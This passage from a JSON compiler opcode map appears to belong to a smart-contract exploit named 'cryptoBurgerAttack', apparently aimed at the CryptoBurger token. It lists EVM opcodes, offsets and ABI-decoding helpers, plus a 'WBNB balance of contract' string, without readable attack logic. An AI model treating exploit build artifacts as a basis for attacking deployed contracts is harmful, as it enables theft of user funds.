      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "11115": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "11117": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "DUP1",
      "path": "0"
    },
    "11118": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "11119": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "11120": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "11122": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "REVERT",
      "path": "0"
    },
    "11123": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "11124": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "POP",
      "path": "0"
    },
    "11125": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "POP",
      "path": "0"
    },
    "11126": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "POP",
      "path": "0"
    },
    "11127": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12565,
        12812
      ],
      "op": "POP",
      "path": "0"
    },
    "11128": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12303,
        12819
      ],
      "op": "POP",
      "path": "0"
    },
    "11129": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12102,
        12819
      ],
      "op": "POP",
      "path": "0"
    },
    "11130": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12102,
        12819
      ],
      "op": "POP",
      "path": "0"
    },
    "11131": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12102,
        12819
      ],
      "op": "POP",
      "path": "0"
    },
    "11132": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12102,
        12819
      ],
      "op": "POP",
      "path": "0"
    },
    "11133": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12102,
        12819
      ],
      "op": "POP",
      "path": "0"
    },
    "11134": {
      "fn": "cryptoBurgerAttack.swapIt",
      "jump": "o",
      "offset": [
        12102,
        12819
      ],
      "op": "JUMP",
      "path": "0"
    },
    "11135": {
      "op": "JUMPDEST"
    },
    "11136": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "11138": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "11140": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "11142": {
      "op": "SHL"
    },
    "11143": {
      "op": "SUB"
    },
    "11144": {
      "op": "DUP2"
    },
    "11145": {
      "op": "AND"
    },
    "11146": {
      "op": "DUP2"
    },
    "11147": {
      "op": "EQ"
    },
    "11148": {
      "op": "PUSH2",
      "value": "0x2B94"
    },
    "11151": {
      "op": "JUMPI"
    },
    "11152": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11154": {
      "op": "DUP1"
    },
    "11155": {
      "op": "REVERT"
    },
    "11156": {
      "op": "JUMPDEST"
    },
    "11157": {
      "op": "POP"
    },
    "11158": {
      "jump": "o",
      "op": "JUMP"
    },
    "11159": {
      "op": "JUMPDEST"
    },
    "11160": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11162": {
      "op": "DUP1"
    },
    "11163": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11165": {
      "op": "DUP1"
    },
    "11166": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11168": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "11170": {
      "op": "DUP7"
    },
    "11171": {
      "op": "DUP9"
    },
    "11172": {
      "op": "SUB"
    },
    "11173": {
      "op": "SLT"
    },
    "11174": {
      "op": "ISZERO"
    },
    "11175": {
      "op": "PUSH2",
      "value": "0x2BAF"
    },
    "11178": {
      "op": "JUMPI"
    },
    "11179": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11181": {
      "op": "DUP1"
    },
    "11182": {
      "op": "REVERT"
    },
    "11183": {
      "op": "JUMPDEST"
    },
    "11184": {
      "op": "DUP6"
    },
    "11185": {
      "op": "CALLDATALOAD"
    },
    "11186": {
      "op": "PUSH2",
      "value": "0x2BBA"
    },
    "11189": {
      "op": "DUP2"
    },
    "11190": {
      "op": "PUSH2",
      "value": "0x2B7F"
    },
    "11193": {
      "jump": "i",
      "op": "JUMP"
    },
    "11194": {
      "op": "JUMPDEST"
    },
    "11195": {
      "op": "SWAP5"
    },
    "11196": {
      "op": "POP"
    },
    "11197": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11199": {
      "op": "DUP7"
    },
    "11200": {
      "op": "ADD"
    },
    "11201": {
      "op": "CALLDATALOAD"
    },
    "11202": {
      "op": "SWAP4"
    },
    "11203": {
      "op": "POP"
    },
    "11204": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "11206": {
      "op": "DUP7"
    },
    "11207": {
      "op": "ADD"
    },
    "11208": {
      "op": "CALLDATALOAD"
    },
    "11209": {
      "op": "SWAP3"
    },
    "11210": {
      "op": "POP"
    },
    "11211": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "11213": {
      "op": "DUP7"
    },
    "11214": {
      "op": "ADD"
    },
    "11215": {
      "op": "CALLDATALOAD"
    },
    "11216": {
      "op": "PUSH8",
      "value": "0xFFFFFFFFFFFFFFFF"
    },
    "11225": {
      "op": "DUP1"
    },
    "11226": {
      "op": "DUP3"
    },
    "11227": {
      "op": "GT"
    },
    "11228": {
      "op": "ISZERO"
    },
    "11229": {
      "op": "PUSH2",
      "value": "0x2BE5"
    },
    "11232": {
      "op": "JUMPI"
    },
    "11233": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11235": {
      "op": "DUP1"
    },
    "11236": {
      "op": "REVERT"
    },
    "11237": {
      "op": "JUMPDEST"
    },
    "11238": {
      "op": "DUP2"
    },
    "11239": {
      "op": "DUP9"
    },
    "11240": {
      "op": "ADD"
    },
    "11241": {
      "op": "SWAP2"
    },
    "11242": {
      "op": "POP"
    },
    "11243": {
      "op": "DUP9"
    },
    "11244": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "11246": {
      "op": "DUP4"
    },
    "11247": {
      "op": "ADD"
    },
    "11248": {
      "op": "SLT"
    },
    "11249": {
      "op": "PUSH2",
      "value": "0x2BF9"
    },
    "11252": {
      "op": "JUMPI"
    },
    "11253": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11255": {
      "op": "DUP1"
    },
    "11256": {
      "op": "REVERT"
    },
    "11257": {
      "op": "JUMPDEST"
    },
    "11258": {
      "op": "DUP2"
    },
    "11259": {
      "op": "CALLDATALOAD"
    },
    "11260": {
      "op": "DUP2"
    },
    "11261": {
      "op": "DUP2"
    },
    "11262": {
      "op": "GT"
    },
    "11263": {
      "op": "ISZERO"
    },
    "11264": {
      "op": "PUSH2",
      "value": "0x2C08"
    },
    "11267": {
      "op": "JUMPI"
    },
    "11268": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11270": {
      "op": "DUP1"
    },
    "11271": {
      "op": "REVERT"
    },
    "11272": {
      "op": "JUMPDEST"
    },
    "11273": {
      "op": "DUP10"
    },
    "11274": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11276": {
      "op": "DUP3"
    },
    "11277": {
      "op": "DUP6"
    },
    "11278": {
      "op": "ADD"
    },
    "11279": {
      "op": "ADD"
    },
    "11280": {
      "op": "GT"
    },
    "11281": {
      "op": "ISZERO"
    },
    "11282": {
      "op": "PUSH2",
      "value": "0x2C1A"
    },
    "11285": {
      "op": "JUMPI"
    },
    "11286": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11288": {
      "op": "DUP1"
    },
    "11289": {
      "op": "REVERT"
    },
    "11290": {
      "op": "JUMPDEST"
    },
    "11291": {
      "op": "SWAP7"
    },
    "11292": {
      "op": "SWAP10"
    },
    "11293": {
      "op": "SWAP6"
    },
    "11294": {
      "op": "SWAP9"
    },
    "11295": {
      "op": "POP"
    },
    "11296": {
      "op": "SWAP4"
    },
    "11297": {
      "op": "SWAP7"
    },
    "11298": {
      "op": "POP"
    },
    "11299": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11301": {
      "op": "ADD"
    },
    "11302": {
      "op": "SWAP5"
    },
    "11303": {
      "op": "SWAP4"
    },
    "11304": {
      "op": "SWAP3"
    },
    "11305": {
      "op": "POP"
    },
    "11306": {
      "op": "POP"
    },
    "11307": {
      "op": "POP"
    },
    "11308": {
      "jump": "o",
      "op": "JUMP"
    },
    "11309": {
      "op": "JUMPDEST"
    },
    "11310": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11312": {
      "op": "DUP1"
    },
    "11313": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "11315": {
      "op": "DUP4"
    },
    "11316": {
      "op": "DUP6"
    },
    "11317": {
      "op": "SUB"
    },
    "11318": {
      "op": "SLT"
    },
    "11319": {
      "op": "ISZERO"
    },
    "11320": {
      "op": "PUSH2",
      "value": "0x2C40"
    },
    "11323": {
      "op": "JUMPI"
    },
    "11324": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11326": {
      "op": "DUP1"
    },
    "11327": {
      "op": "REVERT"
    },
    "11328": {
      "op": "JUMPDEST"
    },
    "11329": {
      "op": "DUP3"
    },
    "11330": {
      "op": "CALLDATALOAD"
    },
    "11331": {
      "op": "PUSH2",
      "value": "0x2C4B"
    },
    "11334": {
      "op": "DUP2"
    },
    "11335": {
      "op": "PUSH2",
      "value": "0x2B7F"
    },
    "11338": {
      "jump": "i",
      "op": "JUMP"
    },
    "11339": {
      "op": "JUMPDEST"
    },
    "11340": {
      "op": "SWAP5"
    },
    "11341": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11343": {
      "op": "SWAP4"
    },
    "11344": {
      "op": "SWAP1"
    },
    "11345": {
      "op": "SWAP4"
    },
    "11346": {
      "op": "ADD"
    },
    "11347": {
      "op": "CALLDATALOAD"
    },
    "11348": {
      "op": "SWAP4"
    },
    "11349": {
      "op": "POP"
    },
    "11350": {
      "op": "POP"
    },
    "11351": {
      "op": "POP"
    },
    "11352": {
      "jump": "o",
      "op": "JUMP"
    },
    "11353": {
      "op": "JUMPDEST"
    },
    "11354": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11356": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11358": {
      "op": "DUP3"
    },
    "11359": {
      "op": "DUP5"
    },
    "11360": {
      "op": "SUB"
    },
    "11361": {
      "op": "SLT"
    },
    "11362": {
      "op": "ISZERO"
    },
    "11363": {
      "op": "PUSH2",
      "value": "0x2C6B"
    },
    "11366": {
      "op": "JUMPI"
    },
    "11367": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11369": {
      "op": "DUP1"
    },
    "11370": {
      "op": "REVERT"
    },
    "11371": {
      "op": "JUMPDEST"
    },
    "11372": {
      "op": "DUP2"
    },
    "11373": {
      "op": "MLOAD"
    },
    "11374": {
      "op": "PUSH2",
      "value": "0x2C76"
    },
    "11377": {
      "op": "DUP2"
    },
    "11378": {
      "op": "PUSH2",
      "value": "0x2B7F"
    },
    "11381": {
      "jump": "i",
      "op": "JUMP"
    },
    "11382": {
      "op": "JUMPDEST"
    },
    "11383": {
      "op": "SWAP4"
    },
    "11384": {
      "op": "SWAP3"
    },
    "11385": {
      "op": "POP"
    },
    "11386": {
      "op": "POP"
    },
    "11387": {
      "op": "POP"
    },
    "11388": {
      "jump": "o",
      "op": "JUMP"
    },
    "11389": {
      "op": "JUMPDEST"
    },
    "11390": {
      "op": "PUSH4",
      "value": "0x4E487B71"
    },
    "11395": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "11397": {
      "op": "SHL"
    },
    "11398": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11400": {
      "op": "MSTORE"
    },
    "11401": {
      "op": "PUSH1",
      "value": "0x41"
    },
    "11403": {
      "op": "PUSH1",
      "value": "0x4"
    },
    "11405": {
      "op": "MSTORE"
    },
    "11406": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "11408": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11410": {
      "op": "REVERT"
    },
    "11411": {
      "op": "JUMPDEST"
    },
    "11412": {
      "op": "PUSH4",
      "value": "0x4E487B71"
    },
    "11417": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "11419": {
      "op": "SHL"
    },
    "11420": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11422": {
      "op": "MSTORE"
    },
    "11423": {
      "op": "PUSH1",
      "value": "0x32"
    },
    "11425": {
      "op": "PUSH1",
      "value": "0x4"
    },
    "11427": {
      "op": "MSTORE"
    },
    "11428": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "11430": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11432": {
      "op": "REVERT"
    },
    "11433": {
      "op": "JUMPDEST"
    },
    "11434": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11436": {
      "op": "DUP2"
    },
    "11437": {
      "op": "MLOAD"
    },
    "11438": {
      "op": "DUP1"
    },
    "11439": {
      "op": "DUP5"
    },
    "11440": {
      "op": "MSTORE"
    },
    "11441": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11443": {
      "op": "DUP1"
    },
    "11444": {
      "op": "DUP6"
    },
    "11445": {
      "op": "ADD"
    },
    "11446": {
      "op": "SWAP5"
    },
    "11447": {
      "op": "POP"
    },
    "11448": {
      "op": "DUP1"
    },
    "11449": {
      "op": "DUP5"
    },
    "11450": {
      "op": "ADD"
    },
    "11451": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11453": {
      "op": "JUMPDEST"
    },
    "11454": {
      "op": "DUP4"
    },
    "11455": {
      "op": "DUP2"
    },
    "11456": {
      "op": "LT"
    },
    "11457": {
      "op": "ISZERO"
    },
    "11458": {
      "op": "PUSH2",
      "value": "0x2CE2"
    },
    "11461": {
      "op": "JUMPI"
    },
    "11462": {
      "op": "DUP2"
    },
    "11463": {
      "op": "MLOAD"
    },
    "11464": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "11466": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "11468": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "11470": {
      "op": "SHL"
    },
    "11471": {
      "op": "SUB"
    },
    "11472": {
      "op": "AND"
    },
    "11473": {
      "op": "DUP8"
    },
    "11474": {
      "op": "MSTORE"
    },
    "11475": {
      "op": "SWAP6"
    },
    "11476": {
      "op": "DUP3"
    },
    "11477": {
      "op": "ADD"
    },
    "11478": {
      "op": "SWAP6"
    },
    "11479": {
      "op": "SWAP1"
    },
    "11480": {
      "op": "DUP3"
    },
    "11481": {
      "op": "ADD"
    },
    "11482": {
      "op": "SWAP1"
    },
    "11483": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "11485": {
      "op": "ADD"
    },
    "11486": {
      "op": "PUSH2",
      "value": "0x2CBD"
    },
    "11489": {
      "op": "JUMP"
    },
    "11490": {
      "op": "JUMPDEST"
    },
    "11491": {
      "op": "POP"
    },
    "11492": {
      "op": "SWAP5"
    },
    "11493": {
      "op": "SWAP6"
    },
    "11494": {
      "op": "SWAP5"
    },
    "11495": {
      "op": "POP"
    },
    "11496": {
      "op": "POP"
    },
    "11497": {
      "op": "POP"
    },
    "11498": {
      "op": "POP"
    },
    "11499": {
      "op": "POP"
    },
    "11500": {
      "jump": "o",
      "op": "JUMP"
    },
    "11501": {
      "op": "JUMPDEST"
    },
    "11502": {
      "op": "DUP3"
    },
    "11503": {
      "op": "DUP2"
    },
    "11504": {
      "op": "MSTORE"
    },
    "11505": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "11507": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11509": {
      "op": "DUP3"
    },
    "11510": {
      "op": "ADD"
    },
    "11511": {
      "op": "MSTORE"
    },
    "11512": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11514": {
      "op": "PUSH2",
      "value": "0x2D06"
    },
    "11517": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "11519": {
      "op": "DUP4"
    },
    "11520": {
      "op": "ADD"
    },
    "11521": {
      "op": "DUP5"
    },
    "11522": {
      "op": "PUSH2",
      "value": "0x2CA9"
    },
    "11525": {
      "jump": "i",
      "op": "JUMP"
    },
    "11526": {
      "op": "JUMPDEST"
    },
    "11527": {
      "op": "SWAP5"
    },
    "11528": {
      "op": "SWAP4"
    },
    "11529": {
      "op": "POP"
    },
    "11530": {
      "op": "POP"
    },
    "11531": {
      "op": "POP"
    },
    "11532": {
      "op": "POP"
    },
    "11533": {
      "jump": "o",
      "op": "JUMP"
    },
    "11534": {
      "op": "JUMPDEST"
    },
    "11535": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11537": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11539": {
      "op": "DUP1"
    },
    "11540": {
      "op": "DUP4"
    },
    "11541": {
      "op": "DUP6"
    },
    "11542": {
      "op": "SUB"
    },
    "11543": {
      "op": "SLT"
    },
    "11544": {
      "op": "ISZERO"
    },
    "11545": {
      "op": "PUSH2",
      "value": "0x2D21"
    },
    "11548": {
      "op": "JUMPI"
    },
    "11549": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11551": {
      "op": "DUP1"
    },
    "11552": {
      "op": "REVERT"
    },
    "11553": {
      "op": "JUMPDEST"
    },
    "11554": {
      "op": "DUP3"
    },
    "11555": {
      "op": "MLOAD"
    },
    "11556": {
      "op": "PUSH8",
      "value": "0xFFFFFFFFFFFFFFFF"
    },
    "11565": {
      "op": "DUP1"
    },
    "11566": {
      "op": "DUP3"
    },
    "11567": {
      "op": "GT"
    },
    "11568": {
      "op": "ISZERO"
    },
    "11569": {
      "op": "PUSH2",
      "value": "0x2D39"
    },
    "11572": {
      "op": "JUMPI"
    },
    "11573": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11575": {
      "op": "DUP1"
    },
    "11576": {
      "op": "REVERT"
    },
    "11577": {
      "op": "JUMPDEST"
    },
    "11578": {
      "op": "DUP2"
    },
    "11579": {
      "op": "DUP6"
    },
    "11580": {
      "op": "ADD"
    },
    "11581": {
      "op": "SWAP2"
    },
    "11582": {
      "op": "POP"
    },
    "11583": {
      "op": "DUP6"
    },
    "11584": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "11586": {
      "op": "DUP4"
    },
    "11587": {
      "op": "ADD"
    },
    "11588": {
      "op": "SLT"
    },
    "11589": {
      "op": "PUSH2",
      "value": "0x2D4D"
    },
    "11592": {
      "op": "JUMPI"
    },
    "11593": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11595": {
      "op": "DUP1"
    },
    "11596": {
      "op": "REVERT"
    },
    "11597": {
      "op": "JUMPDEST"
    },
    "11598": {
      "op": "DUP2"
    },
    "11599": {
      "op": "MLOAD"
    },
    "11600": {
      "op": "DUP2"
    },
    "11601": {
      "op": "DUP2"
    },
    "11602": {
      "op": "GT"
    },
    "11603": {
      "op": "ISZERO"
    },
    "11604": {
      "op": "PUSH2",
      "value": "0x2D5F"
    },
    "11607": {
      "op": "JUMPI"
    },
    "11608": {
      "op": "PUSH2",
      "value": "0x2D5F"
    },
    "11611": {
      "op": "PUSH2",
      "value": "0x2C7D"
    },
    "11614": {
      "jump": "i",
      "op": "JUMP"
    },
    "11615": {
      "op": "JUMPDEST"
    },
    "11616": {
      "op": "DUP1"
    },
    "11617": {
      "op": "PUSH1",
      "value": "0x5"
    },
    "11619": {
      "op": "SHL"
    },
    "11620": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "11622": {
      "op": "MLOAD"
    },
    "11623": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "11625": {
      "op": "NOT"
    },
    "11626": {
      "op": "PUSH1",
      "value": "0x3F"
    },
    "11628": {
      "op": "DUP4"
    },
    "11629": {
      "op": "ADD"
    },
    "11630": {
      "op": "AND"
    },
    "11631": {
      "op": "DUP2"
    },
    "11632": {
      "op": "ADD"
    },
    "11633": {
      "op": "DUP2"
    },
    "11634": {
      "op": "DUP2"
    },
    "11635": {
      "op": "LT"
    },
    "11636": {
      "op": "DUP6"
    },
    "11637": {
      "op": "DUP3"
    },
    "11638": {
      "op": "GT"
    },
    "11639": {
      "op": "OR"
    },
    "11640": {
      "op": "ISZERO"
    },
    "11641": {
      "op": "PUSH2",
      "value": "0x2D84"
    },
    "11644": {
      "op": "JUMPI"
    },
    "11645": {
      "op": "PUSH2",
      "value": "0x2D84"
    },
    "11648": {
      "op": "PUSH2",
      "value": "0x2C7D"
    },
    "11651": {
      "jump": "i",
      "op": "JUMP"
    },
    "11652": {
      "op": "JUMPDEST"
    },
    "11653": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "11655": {
      "op": "MSTORE"
    },
    "11656": {
      "op": "SWAP2"
    },
    "11657": {
      "op": "DUP3"
    },
    "11658": {
      "op": "MSTORE"
    },
    "11659": {
      "op": "DUP5"
    },
    "11660": {
      "op": "DUP3"
    },
    "11661": {
      "op": "ADD"
    },
    "11662": {
      "op": "SWAP3"
    },
    "11663": {
      "op": "POP"
    },
    "11664": {
      "op": "DUP4"
    },
    "11665": {
      "op": "DUP2"
    },
    "11666": {
      "op": "ADD"
    },
    "11667": {
      "op": "DUP6"
    },
    "11668": {
      "op": "ADD"
    },
    "11669": {
      "op": "SWAP2"
    },
    "11670": {
      "op": "DUP9"
    },
    "11671": {
      "op": "DUP4"
    },
    "11672": {
      "op": "GT"
    },
    "11673": {
      "op": "ISZERO"
    },
    "11674": {
      "op": "PUSH2",
      "value": "0x2DA2"
    },
    "11677": {
      "op": "JUMPI"
    },
    "11678": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11680": {
      "op": "DUP1"
    },
    "11681": {
      "op": "REVERT"
    },
    "11682": {
      "op": "JUMPDEST"
    },
    "11683": {
      "op": "SWAP4"
    },
    "11684": {
      "op": "DUP6"
    },
    "11685": {
      "op": "ADD"
    },
    "11686": {
      "op": "SWAP4"
    },
    "11687": {
      "op": "JUMPDEST"
    },
    "11688": {
      "op": "DUP3"
    },
    "11689": {
      "op": "DUP6"
    },
    "11690": {
      "op": "LT"
    },
    "11691": {
      "op": "ISZERO"
    },
    "11692": {
      "op": "PUSH2",
      "value": "0x2DC0"
    },
    "11695": {
      "op": "JUMPI"
    },
    "11696": {
      "op": "DUP5"
    },
    "11697": {
      "op": "MLOAD"
    },
    "11698": {
      "op": "DUP5"
    },
    "11699": {
      "op": "MSTORE"
    },
    "11700": {
      "op": "SWAP4"
    },
    "11701": {
      "op": "DUP6"
    },
    "11702": {
      "op": "ADD"
    },
    "11703": {
      "op": "SWAP4"
    },
    "11704": {
      "op": "SWAP3"
    },
    "11705": {
      "op": "DUP6"
    },
    "11706": {
      "op": "ADD"
    },
    "11707": {
      "op": "SWAP3"
    },
    "11708": {
      "op": "PUSH2",
      "value": "0x2DA7"
    },
    "11711": {
      "op": "JUMP"
    },
    "11712": {
      "op": "JUMPDEST"
    },
    "11713": {
      "op": "SWAP9"
    },
    "11714": {
      "op": "SWAP8"
    },
    "11715": {
      "op": "POP"
    },
    "11716": {
      "op": "POP"
    },
    "11717": {
      "op": "POP"
    },
    "11718": {
      "op": "POP"
    },
    "11719": {
      "op": "POP"
    },
    "11720": {
      "op": "POP"
    },
    "11721": {
      "op": "POP"
    },
    "11722": {
      "op": "POP"
    },
    "11723": {
      "jump": "o",
      "op": "JUMP"
    },
    "11724": {
      "op": "JUMPDEST"
    },
    "11725": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11727": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11729": {
      "op": "DUP3"
    },
    "11730": {
      "op": "DUP5"
    },
    "11731": {
      "op": "SUB"
    },
    "11732": {
      "op": "SLT"
    },
    "11733": {
      "op": "ISZERO"
    },
    "11734": {
      "op": "PUSH2",
      "value": "0x2DDE"
    },
    "11737": {
      "op": "JUMPI"
    },
    "11738": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11740": {
      "op": "DUP1"
    },
    "11741": {
      "op": "REVERT"
    },
    "11742": {
      "op": "JUMPDEST"
    },
    "11743": {
      "op": "POP"
    },
    "11744": {
      "op": "MLOAD"
    },
    "11745": {
      "op": "SWAP2"
    },
    "11746": {
      "op": "SWAP1"
    },
    "11747": {
      "op": "POP"
    },
    "11748": {
      "jump": "o",
      "op": "JUMP"
    },
    "11749": {
      "op": "JUMPDEST"
    },
    "11750": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "11752": {
      "op": "DUP1"
    },
    "11753": {
      "op": "DUP3"
    },
    "11754": {
      "op": "MSTORE"
    },
    "11755": {
      "op": "PUSH1",
      "value": "0x18"
    },
    "11757": {
      "op": "SWAP1"
    },
    "11758": {
      "op": "DUP3"
    },
    "11759": {
      "op": "ADD"
    },
    "11760": {
      "op": "MSTORE"
    },
    "11761": {
      "op": "PUSH32",
      "value": "0x57424E422062616C616E6365206F6620636F6E74726163740000000000000000"
    },
    "11794": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "11796": {
      "op": "DUP3"
    },
    "11797": {
      "op": "ADD"
    },
    "11798": {
      "op": "MSTORE"
    },
    "11799": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11801": {
      "op": "DUP2"
    },
    "11802": {
      "op": "ADD"
    },
    "11803": {
      "op": "SWAP2"
    },
    "11804": {
      "op": "SWAP1"
    },
    "11805": {
      "op": "SWAP2"
    },
    "11806": {
      "op": "MSTORE"
    },
    "11807": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "11809": {
      "op": "ADD"
    },
    "11810": {
      "op": "SWAP1"
    },
    "11811": {
      "jump": "o",
      "op": "JUMP"
    },
    "11812": {
      "op": "JUMPDEST"
    },
    "11813": {
      "op": "PUSH4",
      "value": "0x4E487B71"
    },
    "11818": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "11820": {
      "op": "SHL"
    },
    "11821": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11823": {
      "op": "MSTORE"
    },
    "11824": {
      "op": "PUSH1",
      "value": "0x11"
    },
    "11826": {
      "op": "PUSH1",
      "value": "0x4"
    },
    "11828": {
      "op": "MSTORE"
    },
    "11829": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "11831": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11833": {
      "op": "REVERT"
    },
    "11834": {
      "op": "JUMPDEST"
    },
    "11835": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11837": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "11839": {
      "op": "DUP3"
    },
    "11840": {
      "op": "ADD"
    },
    "11841": {
      "op": "PUSH2",
      "value": "0x2E4C"
    },
    "11844": {
      "op": "JUMPI"
    },
    "11845": {
      "op": "PUSH2",
      "value": "0x2E4C"
    },
    "11848": {
      "op": "PUSH2",
      "value": "0x2E24"
    },
    "11851": {
      "jump": "i",
      "op": "JUMP"
    },
    "11852": {
      "op": "JUMPDEST"
    },
    "11853": {
      "op": "POP"
    },
    "11854": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "11856": {
      "op": "ADD"
    },
    "11857": {
      "op": "SWAP1"
    },
    "11858": {
      "jump": "o",
      "op": "JUMP"
    },
    "11859": {
      "op": "JUMPDEST"
    },
    "11860": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11862": {
      "op": "DUP2"
    },
    "11863": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11865": {
      "op": "NOT"
    },
    "11866": {
      "op": "DIV"
    },
    "11867": {
      "op": "DUP4"
    },
    "11868": {
      "op": "GT"
    },
    "11869": {
      "op": "DUP3"
    },
    "11870": {
      "op": "ISZERO"
    },
    "11871": {
      "op": "ISZERO"
    },
    "11872": {
      "op": "AND"
    },
    "11873": {
      "op": "ISZERO"
    },
    "11874": {
      "op": "PUSH2",
      "value": "0x2E6D"
    },
    "11877": {
      "op": "JUMPI"
    },
    "11878": {
      "op": "PUSH2",
      "value": "0x2E6D"
    },
    "11881": {
      "op": "PUSH2",
      "value": "0x2E24"
    },
    "11884": {
      "jump": "i",
      "op": "JUMP"
    },
    "11885": {
      "op": "JUMPDEST"
    },
    "11886": {
      "op": "POP"
    },
    "11887": {
      "op": "MUL"
    },
    "11888": {
      "op": "SWAP1"
    },
    "11889": {
      "jump": "o",
      "op": "JUMP"
    },
    "11890": {
      "op": "JUMPDEST"
    },
    "11891": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11893": {
      "op": "DUP3"
    },
    "11894": {
      "op": "PUSH2",
      "value": "0x2E8F"
    },
    "11897": {
      "op": "JUMPI"
    },
    "11898": {
      "op": "PUSH4",
      "value": "0x4E487B71"
    },
    "11903": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "11905": {
      "op": "SHL"
    },
    "11906": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11908": {
      "op": "MSTORE"
    },
    "11909": {
      "op": "PUSH1",
      "value": "0x12"
    },
    "11911": {
      "op": "PUSH1",
      "value": "0x4"
    },
    "11913": {
      "op": "MSTORE"
    },
    "11914": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "11916": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11918": {
      "op": "REVERT"
    },
    "11919": {
      "op": "JUMPDEST"
    },
